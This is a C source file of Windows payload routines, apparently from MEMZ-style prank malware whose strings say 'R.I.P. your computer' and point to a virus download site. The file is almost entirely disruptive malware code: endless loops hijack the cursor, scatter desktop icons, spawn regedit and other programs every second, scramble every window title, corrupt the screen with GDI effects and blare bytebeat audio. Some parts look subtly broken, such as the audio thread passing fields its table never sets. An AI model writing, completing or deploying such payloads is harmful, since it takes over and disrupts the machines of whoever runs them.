#include "payload.h"
#include "timer.h"
#include "vscreen.h"

DWORD xs;
HCRYPTPROV prov;
HHOOK hMsgHook;

VOID seedxorshift32(DWORD dwSeed) {
	xs = dwSeed;
}

DWORD xorshift32(VOID) {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}

const char* executes[] = {
	"explorer",
	"calc",
	"notepad",
	"mspaint",
	"regedit"
};
const size_t nExecutes = sizeof(executes) / sizeof(void*);

const char* msgs[] = {
	"R.I.P. your computer",
	"PAYLOADS INCOMING",
	"=D",
	"want virus? visit memz.download"
};

const size_t nMsgs = sizeof(msgs) / sizeof(void*);

AUDIO_SEQUENCE_PARAMS pAudioSequences[5] = {
		{ 8000, 8000 * 30, AudioSequence1 },
		{ 8000, 8000 * 30, AudioSequence2 },
		{ 8000, 8000 * 30, AudioSequence3 },
		{ 8000, 8000 * 30, AudioSequence4 },
		{ 8000, 8000 * 30, AudioSequence5 },
};

DWORD random(VOID) {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE*)(&out));
	return out & 0x7fffffff;
}

POINT MakePoint(INT x, INT y) {
	POINT p;
	p.x = x;
	p.y = y;
	return p;
}

BITMAPINFO DefaultBitmapInfo(INT w, INT h) {
	BITMAPINFO bmi = { 0 };
	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = w;
	bmi.bmiHeader.biHeight = h;
	return bmi;
}

VOID WINAPI CursorMess(VOID) {
	SIZE szScreen = GetVirtualScreenSize();
	for (;;) {
		SetCursorPos(xorshift32() % szScreen.cx, xorshift32() % szScreen.cy);
	}
}

VOID WINAPI DesktopMess(VOID) {
	HWND progman = FindWindow(L"Progman", L"Program Manager");
	HWND defview = FindWindowEx(progman, 0, L"SHELLDLL_DefView", NULL);
	HWND listview = FindWindowEx(defview, 0, L"SysListView32", L"FolderView");
	SIZE szScreen = GetVirtualScreenSize();
	INT cnt = SendMessage(listview, LVM_GETITEMCOUNT, 0, 0);
	for (;;) {
		for (INT i = 0; i < cnt; i++) {
			SendMessage(listview, LVM_SETITEMPOSITION, i, MAKELPARAM(random() % szScreen.cx, random() % szScreen.cy));
		}
	}
}

VOID WINAPI RandomPop(VOID) {
	for (;;) {
		ShellExecuteA(NULL, NULL, executes[xorshift32() % nExecutes], NULL, NULL, SW_SHOWNORMAL);
		Sleep(1000);
	}
}

BOOL CALLBACK EnumWindowFunc(_In_ HWND hwnd, _In_ LPARAM lParam) {
	WCHAR title[100];
	for (INT i = 0; i < 100; i++) {
		title[i] = (WCHAR)(xorshift32() % 100);
	}
	SetWindowTextW(hwnd, title);
}

VOID WINAPI EnumWindowProc(VOID) {
	for (;;) {
		EnumWindows(EnumWindowFunc, TRUE);
	}
}

VOID ExecutePayload(FX_PAYLOAD payload, DWORD dwTime) {
	INT dwStartTime = dwTimeElapsed;
	seedxorshift32(__rdtsc());
	for (INT i = 0, j = dwTimeElapsed; (j + dwTime) > dwTimeElapsed; i++) {
		HDC hdcScreen = GetDC(NULL);
		payload(i, hdcScreen);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
	}
}

VOID Payload1(_In_ INT t, _In_ HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x + t % (szScreen.cx * 2) - szScreen.cx, ptScreen.y + t % (szScreen.cy * 2) - szScreen.cy, NOTSRCERASE);
	HBRUSH randrgb = CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255));
	SelectObject(hdcScreen, randrgb);
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
	DeleteObject(randrgb);
}

VOID Payload2(_In_ INT t, _In_ HDC hdcScreen) {
	INT X, Y, Height;

	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdcScreen = CreateCompatibleDC(hdcScreen);

	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	SelectObject(hcdcScreen, hBitmap);

	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);
	for (INT i = 0; i < 20; i++) {
		X = (xorshift32() % 20);
		Y = (xorshift32() % szScreen.cx) - (150 / 2);
		Height = (xorshift32() % 150);
		BitBlt(hcdcScreen, i, Y, szScreen.cx, Height, hdcScreen, X, 0, PATINVERT);
	}
	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdcScreen, 0, 0, SRCCOPY);
	DeleteObject(hBitmap);
	DeleteObject(hcdcScreen);
}

VOID Payload3(_In_ INT t, _In_ HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	BitBlt(hdcScreen, xorshift32() % 21 - 11, xorshift32() % 21 - 11, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);
	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
	Sleep(15);
}

VOID Payload4(_In_ INT t, _In_ HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdcScreen = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;
	
	SelectObject(hcdcScreen, hBitmap);

	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);
	AlphaBlend(hcdcScreen, ptScreen.x + 5, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);
	AlphaBlend(hcdcScreen, ptScreen.x - 5, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);

	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

	DeleteObject(hBitmap);
	DeleteObject(hcdcScreen);
}

VOID Payload4A(_In_ INT t, _In_ HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdcScreen = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	SelectObject(hcdcScreen, hBitmap);

	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);
	AlphaBlend(hcdcScreen, ptScreen.x - 3, ptScreen.y - 3, szScreen.cx + 6, szScreen.cy + 6, hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);

	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

	DeleteObject(hBitmap);
	DeleteObject(hcdcScreen);
}

VOID Payload5(_In_ INT t, _In_ HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdcScreen = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);

	SelectObject(hcdcScreen, hBitmap);

	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

	XFORM xform;
	xform.eM11 = 1;
	xform.eM12 = 0.1;
	xform.eM21 = 0;
	xform.eM22 = 1;
	xform.eDx = ptScreen.x;
	xform.eDy = ptScreen.y;

	SetGraphicsMode(hdcScreen, GM_ADVANCED);
	SetWorldTransform(hdcScreen, &xform);

	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

	DeleteObject(hBitmap);
	DeleteObject(hcdcScreen);
}

VOID Payload6(_In_ INT t, _In_ HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdcScreen = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);

	SelectObject(hcdcScreen, hBitmap);

	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y + 5, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCAND);
	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y - 5, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCAND);

	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

	DeleteObject(hBitmap);
	DeleteObject(hcdcScreen);

	Sleep(50);
}

VOID Payload7(_In_ INT t, _In_ HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdcScreen = CreateCompatibleDC(hdcScreen);

	BITMAPINFO bminf = { 0 };
	bminf.bmiHeader.biSize = sizeof(BITMAPINFO);
	bminf.bmiHeader.biBitCount = 32;
	bminf.bmiHeader.biPlanes = 1;
	bminf.bmiHeader.biWidth = szScreen.cx;
	bminf.bmiHeader.biHeight = szScreen.cy;

	PRGBQUAD pixlz = { 0 };

	HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bminf, 0, &pixlz, NULL, 0);
	SelectObject(hcdcScreen, hBitmap);

	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

	for (INT i = 0; i < szScreen.cx * szScreen.cy; i++) {
		pixlz[i].r = (pixlz[i].r * 2) % 255;
		pixlz[i].g = (pixlz[i].g * 2) % 255;
		pixlz[i].b = (pixlz[i].b * 2) % 255;
	}

	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

	Sleep(50);

	DeleteObject(hBitmap);
	DeleteObject(pixlz);
	DeleteObject(hcdcScreen);
}

VOID Payload8(_In_ INT t, _In_ HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdcScreen = CreateCompatibleDC(hdcScreen);

	BITMAPINFO bminf = { 0 };
	bminf.bmiHeader.biSize = sizeof(BITMAPINFO);
	bminf.bmiHeader.biBitCount = 32;
	bminf.bmiHeader.biPlanes = 1;
	bminf.bmiHeader.biWidth = szScreen.cx;
	bminf.bmiHeader.biHeight = szScreen.cy;

	PRGBQUAD pixlz = { 0 };

	HBITMAP hBitmap = CreateDIBSection(hdcScreen, &bminf, 0, &pixlz, NULL, 0);
	SelectObject(hcdcScreen, hBitmap);

	for (INT i = 0; i < szScreen.cx * szScreen.cy; i++) {
		pixlz[i].rgb = (xorshift32() % 255) * 65793;
	}

	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);

	DeleteObject(hBitmap);
	DeleteObject(pixlz);
	DeleteObject(hcdcScreen);
}

VOID WINAPI ExecuteAudioSequence(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_In_ AUDIO_SEQUENCE pAudioSequence
) {
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = HeapAlloc(hHeap, 0, nSampleCount * 2);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec * 2, 2, 16, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount * 2, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);

	pAudioSequence(nSamplesPerSec, nSampleCount, psSamples);

	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));

	Sleep(nSampleCount * 1000 / nSamplesPerSec);

	while (!(waveHdr.dwFlags & WHDR_DONE))
	{
		Sleep(1);
	}

	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}

VOID WINAPI AudioThread(VOID) {
	for (;;) {
		for (INT i = 0; i <= 4; i++) {
			ExecuteAudioSequence(
				pAudioSequences[i].nSamplesPerSec,
				pAudioSequences[i].nSampleCount,
				pAudioSequences[i].pAudioSequence,
				pAudioSequences[i].pPreAudioOp,
				pAudioSequences[i].pPostAudioOp
			);
		}
	}
}

VOID AudioSequence1(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)((((t & t >> 8) - (t >> 13 & t)) & ((t & t >> 8) - (t >> 13))) ^ (t >> 8 & t));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

VOID AudioSequence2(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)(t * ((t >> 12 | t >> 8) & 63 & t >> 4));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

VOID AudioSequence3(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)(t * (t >> (t >> 13 & t)));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

VOID AudioSequence4(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)((t * ((t >> 8 & t >> 3) >> (t >> 16 & t))) + ((t * (t >> 8 & t >> 3)) >> (t >> 16 & t)));
		((BYTE*)psSamples)[t] = bFreq;
	}
}

VOID AudioSequence5(
	_In_ INT nSamplesPerSec,
	_In_ INT nSampleCount,
	_Inout_ PSHORT psSamples
) {
	for (INT t = 0; t < nSampleCount * 2; t++) {
		BYTE bFreq = (BYTE)((t | t % 255 | t % 257) + (t & t >> 8) + (t * (42 & t >> 10)) + ((t % ((t >> 8 | t >> 16) + 1)) ^ t));
		((BYTE*)psSamples)[t] = bFreq;
	}
}